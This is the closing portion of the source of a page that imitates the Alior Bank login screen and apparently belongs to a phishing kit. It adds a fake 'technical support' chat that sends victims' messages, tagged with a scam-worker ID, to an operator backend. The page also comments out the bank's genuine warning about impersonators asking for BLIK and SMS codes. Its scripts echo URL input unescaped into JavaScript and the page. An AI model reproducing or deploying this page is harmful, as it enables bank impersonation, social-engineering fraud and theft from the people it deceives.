                                            border-radius: 4px;
                                            height: 500px;
                                          }
                                          
                                          .operatorblock {
                                            height: 130px;
                                            background-color: #920035;
                                            top: 0;
                                          }
                                          
                                          #operator-photo {
                                            width: 60px;
                                            height: 60px;
                                            margin-bottom: 7px;
                                            text-align: center;
                                            margin-top: 8px;
                                          }
                                          
                                          #oper-photo-img {
                                            width: 100%;
                                            height: 100%;
                                            border-radius: 50%;
                                          }
                                          
                                          .operatorblock-content {
                                            padding: 20px;
                                            display: flex;
                                          }
                                          
                                          .operator-name {
                                            font-size: 13px;
                                            color: rgba(255, 255, 255, 0.7);
                                          }
                                          
                                          .team-wrapper {
                                            text-align: center;
                                            width: 60%;
                                            margin-top: 30px;
                                            margin-left: 4%;
                                          }
                                          
                                          .team {
                                            font-size: 16px;
                                            color: #fff;
                                          }
                                          
                                          .activity-indicator {
                                            font-size: 13px;
                                            color: rgba(255, 255, 255, 0.7);
                                          }
                                          
                                          .with-status {
                                            padding-left: 15px;
                                            display: inline-block;
                                            position: relative;
                                          }
                                          
                                          .status-online {
                                            display: block;
                                            background-color: #4fd237;
                                            position: absolute;
                                            right: -3px;
                                            bottom: 3px;
                                            width: 7px;
                                            height: 7px;
                                            background-repeat: no-repeat;
                                            border-radius: 7px;
                                            border-width: 1px;
                                            border-style: solid;
                                            box-sizing: content-box;
                                            left: 0;
                                            right: auto;
                                            border-color: #4fd237;
                                          }
                                          
                                          #input-msg {
                                            border-top: 1px solid #babac05c;
                                            width: 100%;
                                            position: absolute;
                                            bottom: 0;
                                            height: 50px;
                                            margin-bottom: 20px;
                                          }
                                          
                                          #smstosup1 {
                                            margin-left: 10px;
                                            width: 100%;
                                            border: none;
                                            font-size: 15px;
                                          }
                                          
                                          .chaport-container .chaport-input-wrapper .chaport-send-icon,
                                          .chaport-input-wrapper .chaport-send-icon {
                                            opacity: 1;
                                            transform: scale(1);
                                            position: absolute;
                                            bottom: 15px;
                                            left: 7px;
                                            width: 18px;
                                            height: 18px;
                                            transition: opacity 0.2s linear, transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
                                          }
                                          
                                          .chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon,
                                          .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
                                            fill: #414141;
                                            transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
                                          }
                                          
                                          #smstosupbutton1 {
                                            border-width: 0px;
                                            background: #fff;
                                            margin-right: 10px;
                                          }
                                          
                                          #smstosupbutton1 {
                                            cursor: pointer;
                                          }
                                          
                                          #smstosupbutton1:focus,
                                          #smstosupbutton1:active {
                                            outline: none;
                                          }
                                          
                                          .chaport-window {
                                            visibility: hidden;
                                            opacity: 0;
                                          }
                                          
                                          .chat-block {
                                            overflow-y: auto;
                                            height: 300px;
                                            overflow-x: hidden;
                                          }
                                          
                                          #chat {
                                            padding-bottom: 15px;
                                          }
                                          
                                          .operators-msg {
                                            margin-top: 15px;
                                          }
                                          
                                          .operators-first-text {
                                            padding: 10px;
                                            width: 180px;
                                            border-radius: 8px;
                                            background-color: #e8ecef;
                                            padding-right: 30px;
                                          }
                                          
                                          .operators-msg-text {
                                            padding: 10px;
                                            max-width: 180px;
                                            border-radius: 8px;
                                            background-color: #e8ecef;
                                            padding-right: 30px;
                                          }
                                          
                                          .visitors-msg-text {
                                            margin-top: 15px;
                                            margin-right: 10px;
                                            margin-left: 80px;
                                            padding: 10px;
                                            min-width: 180px;
                                            border-radius: 8px;
                                            background-color: #920035;
                                            color: #fff;
                                          }
                                          
                                          .operators-photo img {
                                            width: 30px;
                                            height: 30px;
                                            border-radius: 50%;
                                            margin-left: 5px;
                                            margin-right: 5px;
                                          }
                                          
                                          .chat-block::-webkit-scrollbar {
                                            width: 7px;
                                          }
                                          
                                          .chat-block::-webkit-scrollbar-button {
                                            display: none;
                                          }
                                          
                                          .chat-block::-webkit-scrollbar-thumb {
                                            border-radius: 8px;
                                            background-color: #babac0;
                                            border: 1px solid transparent;
                                          }
                                          
                                          .chat-block::-webkit-scrollbar-thumb {
                                            border-radius: 8px;
                                            background-color: #babac0;
                                            border: 1px solid transparent;
                                          }
                                        </style>
                                        <div id="offonthechap">
                                          <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                                            <div class="chaport-launcher" style="left: 0px; right: 0px;">
                                            <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                                            <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                                            <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                                              <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                                                <div class="chaport-launcher-chat-icon"></div>
                                                <div class="chaport-launcher-close-icon"></div>
                                                <div class="chaport-launcher-operator-photo"></div>
                                              </div>
                                            </div>
                                            <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                                              <div class="chaport-inner">
                                                <div class="main-textblock">
                                                  <div class="operatorblock">
                                                    <div class="operatorblock-content" style="display: flex;">
                                                      <div id="operator-photo"> <img id="oper-photo-img" src="./alior_files/operator-img.png">
                                                        <div class="operator-name">Sofia</div>
                                                      </div>
                                                      <div class="team-wrapper">
                                                        <div class="team">Pomoc techniczna</div>
                                                        <div class="activity-indicator">
                                                          <div class="with-status" style="display: inline-block;">
                                                            <div class="status-online" style="display: inline-block;"> </div>online</div>
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                  <div class="chat-block">
                                                    <div id="chat">
                                                      <div class="operators-msg" id="greeting-msg" style="display: none;">
                                                        <div class="operators-photo"><img src="./alior_files/operator-img.png"></div>
                                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>
                                                      </div>
                                                    </div>
                                                    <div id="input-msg" style="display: flex;">
                                                      <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                                      <button id="smstosupbutton1" onclick="sendMessage()">
                                                        <div class="chaport-send-icon">
                                                          <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                            <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf"> </polygon>
                                                          </svg>
                                                        </div>
                                                      </button>
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>
                                            </div>
                                            <div class="chaport-big-shadow"></div>
                                          </div>
                                        </div>
                                        <system-info>
                                          <div>
                                            <solid-separator class="block my-4">
                                              <div class="solid-separator horizontal"></div>
                                            </solid-separator>
                                            <!-- <div class="service-message">
                                              <ul class="list">
                                                <li class="single-message"> <span tabindex="0" class="system-info-post-date">27.10.2021</span>
                                                  <p tabindex="0"><span>Uważaj! Przestępcy podszywają się pod pracowników banków. Nigdy nie podawaj w rozmowie kodów BLIK, kodów SMS ani danych do logowania do bankowości.</span><a href="https://www.aliorbank.pl/dodatkowe-informacje/bezpieczenstwo/nowe-zagrozenia.html" class="system-info-link" target="_blank" href="https://www.aliorbank.pl/dodatkowe-informacje/bezpieczenstwo/nowe-zagrozenia.html">więcej</a></p>
                                                </li>
                                              </ul>
                                            </div> -->
                                          </div>
                                        </system-info>
                                      </div>
                                    </section>
                                  </external-section>
                                </div>
                                <div class="column small-19 medium-offset-1 medium-8 large-10">
                                  <div class="sign-in-placement"></div>
                                  <div class="lang-switch-section row">
                                    <div class="column expand">
                                      <auth-restrict-card>
                                        <div class="restrict-card">
                                          <div class="has-icon">
                                            <svg width="26" height="26" viewBox="0 0 283.46 283.46" xmlns="http://www.w3.org/2000/svg">
                                              <path d="m241.935 230.769h-206.287c-10.174 0-18.45-8.277-18.45-18.45v-127.777c0-10.173 8.276-18.45 18.45-18.45h206.287c10.174 0 18.45 8.277 18.45 18.45v127.777c.001 10.173-8.276 18.45-18.45 18.45zm-206.287-150.678c-2.454 0-4.45 1.997-4.45 4.45v127.777c0 2.454 1.996 4.45 4.45 4.45h206.287c2.454 0 4.45-1.996 4.45-4.45v-127.776c0-2.454-1.996-4.45-4.45-4.45h-206.287z"></path>
                                              <path d="m249.456 120.377h-218.369c-3.866 0-7-3.134-7-7s3.134-7 7-7h218.369c3.866 0 7 3.134 7 7s-3.134 7-7 7z"></path>
                                              <path d="m251.375 163.054h-218.37c-3.866 0-7-3.134-7-7s3.134-7 7-7h218.37c3.866 0 7 3.134 7 7s-3.134 7-7 7z"></path>
                                            </svg><span class="icon icon-ban"></span> <span tabindex="0">Zastrzeż kartę - kontakt: <strong>12 19 502</strong></span>
                                            <br><span tabindex="0">z zagranicy <strong>+48 12 19 502</strong></span></div>
                                        </div>
                                      </auth-restrict-card>
                                      <div class="spacer s1"></div>
                                    </div>
                                    <div class="column shrink">
                                      <lang-switch>
                                        <custom-select name="lang-switch" class="lang-switch">
                                          <div class="relative lang-switch">
                                            <div>
                                              <div class="selectize-control custom-select single " style="height: 4em;">
                                                <div class="selectize-input items has-options full has-items" role="listbox">
                                                  <div class="option clearfix"><img class="lang-switch-icon" src="./alior_files/alior-image-4.svg" role="presentation"> <span>Polski</span></div>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </custom-select>
                                      </lang-switch>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <security-info>
                              <div>
                                <solid-separator class="block my-4">
                                  <div class="solid-separator horizontal"></div>
                                </solid-separator>
                                <div class="row align-center">
                                  <div class="column small-19 medium-18">
                                    <div class="row security-info-wrapper">
                                      <div class="column expand">
                                        <ul class="list basic security-info-list">
                                          <li class="has-icon" tabindex="0">
                                            <svg viewBox="0 0 283.46 283.46" xmlns="http://www.w3.org/2000/svg" width="24" height="24">
                                              <g fill="#767676">
                                                <path d="m127.278 183.414c-1.792 0-3.583-.684-4.95-2.05l-40.465-40.465c-2.734-2.733-2.734-7.166 0-9.899 2.733-2.733 7.166-2.733 9.899 0l35.515 35.515 64.418-64.418c2.733-2.733 7.166-2.733 9.899 0 2.734 2.733 2.734 7.166 0 9.899l-69.368 69.368c-1.365 1.366-3.156 2.05-4.948 2.05z"></path>
                                                <path d="m141.726 278.172c-1.143 0-2.284-.279-3.318-.836-32.124-17.291-60.664-39.185-84.826-65.074-14.568-15.608-21.954-34.35-21.954-55.707v-130.949c0-3.185 2.149-5.968 5.23-6.772 68.803-17.976 139.358-17.979 209.707-.01 3.099.792 5.268 3.583 5.268 6.782v131.841c0 20.661-6.978 38.954-20.739 54.37-25.096 28.111-54.144 50.205-86.337 65.665-.96.461-1.996.69-3.031.69zm-96.099-247.123v125.506c0 17.944 5.95 33.042 18.188 46.154 22.33 23.925 48.586 44.295 78.084 60.585 29.25-14.571 55.727-35.012 78.749-60.801 11.563-12.953 17.184-27.688 17.184-45.047v-126.368c-64.492-15.621-129.096-15.633-192.205-.029z"></path>
                                              </g>
                                            </svg><span class="icon icon-ban"></span>Sprawdź certyfikat</li>
                                          <li class="has-icon" tabindex="0">
                                            <svg viewBox="0 0 283.46 283.46" xmlns="http://www.w3.org/2000/svg" width="24" height="24">
                                              <g fill="#767676">
                                                <path d="m70.197 136.421c-1.83 0-3.66-.447-5.301-1.342l-1.977-1.079c-.054-.029-.107-.059-.16-.09-14.279-8.282-31.416-9.584-47.016-3.575-3.529 1.359-7.486.463-10.079-2.279-2.592-2.741-3.264-6.738-1.711-10.181 1.894-4.201 3.987-8.236 6.398-12.336 13.569-23.367 27.392-45.757 47.255-62.861 22.792-19.627 50.332-29.168 84.194-29.168 77.789 0 106.292 48.694 131.441 91.656 2.241 3.81 4.276 7.682 6.213 11.823 1.608 3.438.979 7.454-1.604 10.231-2.59 2.785-6.564 3.705-10.119 2.344-15.562-5.952-32.654-4.632-46.889 3.624-.053.031-.107.061-.161.09l-1.979 1.079c-3.397 1.854-7.434 1.814-10.795-.107l-3.085-1.763c-16.857-9.543-37.595-9.607-54.177-.178l-2.652 1.895c-3.506 2.504-8.189 2.741-11.93.603l-2.793-1.596c-8.269-4.771-17.936-7.39-27.245-7.39s-18.976 2.619-27.22 7.375l-3.11 1.777c-1.691.965-3.594 1.448-5.498 1.448zm-.496-14.669.465.254 1.666-.952c10.312-5.95 22.463-9.234 34.19-9.234s23.878 3.285 34.216 9.249l1.141.652 1.411-1.008c.184-.132.375-.254.571-.368 20.905-12.06 47.106-12.07 68.381-.028l1.69.966.466-.254c14.59-8.436 31.539-11.093 47.87-7.744-.199-.346-.399-.69-.603-1.035-24.391-41.668-49.604-84.742-119.366-84.742-64.801 0-91.36 36.869-119.346 85.069-.007.011-.014.023-.02.034-.284.482-.563.964-.837 1.444 16.407-3.423 33.438-.783 48.105 7.697zm-53.301-12.689h.01z"></path>
                                                <path d="m118.721 273.951c-16.875 0-30.589-13.202-31.222-30.055-.145-3.863 2.869-7.113 6.732-7.258 3.84-.144 7.113 2.87 7.258 6.732.349 9.298 7.918 16.581 17.231 16.581 9.508 0 17.244-7.736 17.244-17.244v-83.851c0-3.866 3.134-7 7-7s7 3.134 7 7v83.851c.001 17.228-14.015 31.244-31.243 31.244z"></path>
                                              </g>
                                            </svg><span class="icon icon-ban"></span>Pamiętaj o ochronie antywirusowej</li>
                                          <li class="has-icon" tabindex="0">
                                            <svg viewBox="0 0 283.46 283.46" xmlns="http://www.w3.org/2000/svg" width="24" height="24">
                                              <g fill="#767676">
                                                <path d="m139.635 277.009h-104.621c-10.378 0-18.82-8.443-18.82-18.82v-234.311c0-5.031 1.96-9.759 5.52-13.314 3.554-3.551 8.277-5.506 13.301-5.506h.019l99.354.1c4.961.004 9.623 1.941 13.127 5.456 3.503 3.514 5.427 8.182 5.416 13.144l-.072 52.812c-.003 1.227.472 2.375 1.335 3.239.862.862 2.007 1.336 3.225 1.336h.009l51.525-.072h.038c4.946 0 9.601 1.925 13.105 5.423 3.514 3.507 5.449 8.172 5.449 13.137v21.87c0 3.866-3.134 7-7 7s-7-3.134-7-7v-21.87c0-1.22-.476-2.366-1.339-3.228-.861-.859-2.005-1.333-3.221-1.333-.003 0-.006 0-.01 0l-51.525.072c-.012 0-.024 0-.036 0-4.955 0-9.614-1.93-13.121-5.438-3.516-3.516-5.445-8.19-5.435-13.162l.072-52.812c.003-1.225-.47-2.372-1.331-3.234-.86-.863-2.006-1.339-3.225-1.34l-99.354-.1c-.002 0-.004 0-.005 0-1.286 0-2.496.5-3.406 1.41-.912.911-1.414 2.122-1.414 3.41v234.311c0 2.658 2.162 4.82 4.82 4.82h104.621c3.866 0 7 3.134 7 7s-3.135 7-7.001 7z"></path>
                                                <path d="m216.314 97.985c-1.814 0-3.627-.701-4.998-2.099l-75.086-76.558c-2.706-2.76-2.663-7.192.097-9.899 2.761-2.706 7.192-2.664 9.899.096l75.086 76.559c2.706 2.76 2.663 7.192-.097 9.899-1.362 1.336-3.133 2.002-4.901 2.002z"></path>
                                                <path d="m259.867 277.275h-76.464c-7.716 0-13.993-6.277-13.993-13.994v-46.606c0-7.716 6.277-13.994 13.993-13.994h76.464c7.716 0 13.993 6.277 13.993 13.994v46.606c.001 7.717-6.277 13.994-13.993 13.994zm-76.457-60.593v46.6l76.457-.006-.007-46.6z"></path>
                                                <path d="m251.304 215.98c-3.866 0-7-3.134-7-7v-27.628c0-12.137-9.874-22.01-22.01-22.01-12.137 0-22.011 9.874-22.011 22.01v4.342c0 3.866-3.134 7-7 7s-7-3.134-7-7v-4.342c0-19.856 16.154-36.01 36.011-36.01 19.855 0 36.01 16.154 36.01 36.01v27.628c0 3.867-3.134 7-7 7z"></path>
                                              </g>
                                            </svg><span class="icon icon-ban"></span>Chroń swoje dane</li>
                                        </ul>
                                      </div>
                                      <div class="column shrink"><a href="https://www.aliorbank.pl/dodatkowe-informacje/bezpieczenstwo/bezpieczenstwo-po-stronie-Banku.html" target="_blank" class="security-info-link">Więcej o bezpieczeństwie</a></div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </security-info>
                          </div>
                        </main>
                      </div>
                    </auth.sign-in.cif>
                  </div>
                </div>
              </auth.sign-in>
            </div>
          </div>
        </div>
      </app-ajs-root>
    </div>
    <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>

</body></html>